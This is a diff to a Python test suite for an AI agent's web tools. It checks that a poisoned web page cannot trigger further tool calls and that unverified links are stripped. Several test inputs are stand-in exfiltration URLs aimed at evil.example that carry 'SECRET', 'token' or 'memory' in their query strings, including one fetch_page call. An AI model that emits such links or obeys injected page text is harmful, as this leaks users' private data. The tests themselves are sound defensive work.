@@ -31,8 +31,8 @@ class FakeWeb:
         return PageContent(url=url, final_url=url, title="Страница", text=POISON, truncated=False, content_type="text/html")
 
 
-def _tool_call(name, call_id="c1", **arguments):
-    return SimpleNamespace(id=call_id, function=SimpleNamespace(name=name, arguments=json.dumps(arguments)))
+def _tool_call(tool, /, call_id="c1", **arguments):
+    return SimpleNamespace(id=call_id, function=SimpleNamespace(name=tool, arguments=json.dumps(arguments)))
 
 
 def _response(*, content="", tool_calls=None, finish="stop", cost="0.001"):
@@ -166,7 +166,7 @@ async def test_web_results_withdraw_every_tool_and_taint_the_answer():
     )
     turn = await run_tool_dialogue(llm_client=llm, messages=[{"role": "system", "content": "s"}], run=run)
     assert turn.web_tainted and web.searches == ["погода москва"]
-    assert llm.calls[1]["tools"] == []  # nothing left after the web result
+    assert _names(llm.calls[1]["tools"]) == {"fetch_page"}  # only a page the search returned is still reachable
     assert "https://weather.example/msk" in turn.text
     assert "evil.example/?q" not in turn.text and "x (evil.example)" in turn.text
     assert turn.text.rstrip().endswith("По данным из интернета: weather.example")
@@ -177,7 +177,7 @@ async def test_a_poisoned_page_cannot_start_another_tool_in_a_later_round():
     first = run.allowed_names()
     await run.execute(ToolCall("web_search", {"query": "x"}, "1"), first)
     after = run.allowed_names()
-    assert after == {"read_skill", "create_artifact", "send_artifact"}
+    assert after == {"fetch_page", "read_skill", "create_artifact", "send_artifact"}
     for name in ("web_search", "fetch_page", "ban_user", "get_artifact"):
         assert not (await run.execute(ToolCall(name, {"query": "q"}, "2"), after)).success
     skill = next(t for t in run.definitions(after) if t["function"]["name"] == "read_skill")
@@ -185,9 +185,15 @@ async def test_a_poisoned_page_cannot_start_another_tool_in_a_later_round():
     assert run.artifact_context.web_tainted is True
 
 
-async def test_after_web_without_artifacts_nothing_is_offered():
+async def test_after_web_without_artifacts_only_one_returned_page_can_be_opened():
     run = _run(web=True, artifacts=False)
-    await run.execute(ToolCall("fetch_page", {"url": "https://weather.example/a"}, "1"), run.allowed_names())
+    await run.execute(ToolCall("web_search", {"query": "x"}, "1"), run.allowed_names())
+    allowed = run.allowed_names()
+    assert allowed == {"fetch_page"}
+    elsewhere = await run.execute(ToolCall("fetch_page", {"url": "https://evil.example/?q=memory"}, "2"), allowed)
+    assert not elsewhere.success and run.post_web_fetches == 0
+    opened = await run.execute(ToolCall("fetch_page", {"url": "https://weather.example/msk"}, "3"), allowed)
+    assert opened.success and run.post_web_fetches == 1
     assert run.allowed_names() == frozenset()
 
 
@@ -298,3 +304,20 @@ def test_unverified_links_become_hosts_and_verified_ones_stay():
     assert "[ok](https://a.example/page)" in out and "bad (b.example)" in out
     assert "секрет" not in out and "?m=1" not in out and "c.example" in out
     assert out.endswith("https://a.example/page")
+
+
+def test_addresses_without_a_scheme_are_cut_to_their_host():
+    seen = {"https://good.example/a"}
+    cleaned = strip_unverified_links(
+        "см. evil.example/?q=SECRET, www.evil.example/x и evil.example?token=1, но good.example/a и example.com ок", seen
+    )
+    assert "SECRET" not in cleaned and "token" not in cleaned and "/x" not in cleaned
+    assert "evil.example" in cleaned and "good.example/a" in cleaned and "example.com ок" in cleaned
+    labelled = strip_unverified_links("[evil.example/?q=SECRET](https://good.example/a)", seen)
+    assert "SECRET" not in labelled and "(https://good.example/a)" in labelled
+
+
+async def test_an_empty_last_round_gives_the_fallback_notice():
+    llm = ScriptedLlm(_response(content=""))
+    turn = await run_tool_dialogue(llm_client=llm, messages=[{"role": "system", "content": "s"}], run=_run(rounds=1))
+    assert turn.text == personal_tools._FALLBACK_NOTICE
